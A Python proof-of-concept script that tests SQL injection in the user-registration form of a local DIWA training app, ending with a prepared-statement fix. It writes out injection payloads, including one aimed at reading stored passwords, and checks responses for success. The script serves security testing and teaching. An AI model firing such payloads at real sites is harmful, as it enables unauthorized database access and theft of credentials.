#!/usr/bin/env python3
"""
Stage 2 POC: SQL Injection in User Registration
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: createUser() concatenates username field directly into INSERT query
"""

import requests
import sys
import uuid

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_sqli_register_data_exfil():
    """
    Attempt SQL injection via username field during registration.
    Payload: ' + (SELECT password FROM users LIMIT 1) + '
    Expected: SQL error revealing database structure or successful data manipulation
    """
    print("[*] Testing SQL Injection in Registration (Username Field)...")
    
    try:
        # First, get registration page
        resp = SESSION.get(f"{TARGET}/?page=register")
        if resp.status_code != 200:
            print("❌ NOT REPRODUCIBLE: Cannot reach registration page")
            return False
        
        # Extract invitation code from page (if shown)
        code = "3702"  # Default from config.php
        
        # Craft SQL injection payload in username
        unique_marker = str(uuid.uuid4())[:8]
        payload = {
            'username': f"test{unique_marker}' OR '1'='1",  # SQL injection
            'email': f"test{unique_marker}@example.com",
            'password': 'testpass123',
            'password_check': 'testpass123',
            'country': 'US',
            'invitation_code': code
        }
        
        # Submit registration form
        resp = SESSION.post(f"{TARGET}/?page=register", data=payload, allow_redirects=False)
        
        # Check for SQL error in response (indicates injection reached database)
        if 'SQL' in resp.text or 'syntax error' in resp.text.lower() or 'database' in resp.text.lower():
            print("✅ VULNERABLE: SQL Injection error revealed in response")
            return True
        
        # Check if registration succeeded with malicious payload
        if 'successfully' in resp.text.lower() or 'registered' in resp.text.lower():
            print("✅ VULNERABLE: Malicious payload accepted in registration")
            return True
        
        # Try login with injection-modified username
        login_payload = {
            'email': f"test{unique_marker}@example.com",
            'password': 'testpass123'
        }
        resp2 = SESSION.post(f"{TARGET}/?page=login", data=login_payload, allow_redirects=False)
        if 'loggedin' in resp2.headers.get('Location', '') or 'loggedin' in resp2.text:
            print("✅ VULNERABLE: Account created with SQL injection payload")
            return True
        
        print("❌ NOT REPRODUCIBLE: Injection did not succeed in registration")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_sqli_register_data_exfil()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Replace all string concatenation with prepared statements:

  public function createUser($pUsername, $pPassword, $pEmail, $pCountry, $pHashingAlgorithm) {
      try {
          $stmt = $this->db->prepare(
              'INSERT INTO ' . $this->prefix . 'users (username, password, email, country, is_admin) 
               VALUES (?, ?, ?, ?, 0)'
          );
          $stmt->execute([$pUsername, hash($pHashingAlgorithm, $pPassword), $pEmail, $pCountry]);
          return true;
      }
      catch(Exception $ex) {
          error(500, 'Query could not be executed', $ex);
      }
  }

Key points:
- Use ? for every user-supplied value
- execute() receives values separately from SQL template
- No string concatenation at all
- Apply to isUserEmailInUse(), isUsernameInUse(), getAllUsers(), etc.
"""
